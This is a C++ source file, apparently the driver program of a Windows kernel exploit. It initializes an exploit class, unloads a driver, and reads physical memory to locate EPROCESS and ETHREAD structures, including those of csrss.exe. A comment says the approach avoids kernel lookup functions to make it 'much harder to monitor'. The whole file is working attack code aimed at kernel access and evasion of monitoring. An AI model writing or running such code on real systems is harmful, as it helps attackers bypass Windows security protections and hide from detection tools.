#include <Windows.h>
#include "Kernel.h"
int main() {
    printf("-----                                Starting                                     -----\n");
    Kernel exploit;
    NTSTATUS exploitStatus = exploit.Initialize(true);
    // Initialize the exploit
    if (exploitStatus) {
        printf("[-] Exploit failed to initialize (%llx)\n", exploitStatus);
        return -1;
    }
    else {
        // Cleanup after initialization
        NTSTATUS cleanupStatus = exploit.Cleanup();
        if (cleanupStatus) {
            printf("[-] Exploit failed to cleanup (%llx)\n", cleanupStatus);
            return -1;
        }
    }    

    printf("----- Driver Is unloaded at this point utilizing only the exploit for read/write -----\n");

    // Retrieve current process details
    __int64 currentProcess = exploit.EProcess(GetCurrentProcessId());
    printf("[+] Current EProcess (virtual): %llx\n", currentProcess);

    __int64 directoryTable = exploit.GetProcessDirectoryTable(currentProcess);
    printf("[+] Current Directory Table: %llx\n", directoryTable);

    int uniqueProcessId;
    exploit.ReadPhysical(exploit.TranslateLinearAddress(directoryTable, currentProcess + 0x440), &uniqueProcessId, 4);
    printf("[+] Current UniqueProcessId: %d\n", uniqueProcessId);

    // Simplified reading using template
    __int64 sectionBaseAddress = exploit.Read<__int64>(exploit.TranslateLinearAddress(directoryTable, currentProcess + 0x520));
    printf("[+] Current SectionBaseAddress (virtual): %llx\n", sectionBaseAddress);

    // Demonstration of operations using physical memory instead of there kernel functions such as PsLookupProcessByProcessId or PsLookupThreadByThreadId
    // Making it much harder to monitor
    DWORD currentThreadId = GetCurrentThreadId();
    printf("[+] Current Thread Id: %d\n", currentThreadId);

    __int64 currentEthread = exploit.EThread(directoryTable, currentProcess, currentThreadId);
    printf("[+] Current Ethread: %llx\n", currentEthread);

    int csrssProcessId = exploit.ProcessId("csrss.exe", 1);
    printf("[+] csrss ProcessId: %d\n", csrssProcessId);

    __int64 csrssEProcess = exploit.EProcess(csrssProcessId);
    printf("[+] csrss EProcess: %llx\n", csrssEProcess);
     
    Sleep(-1);
}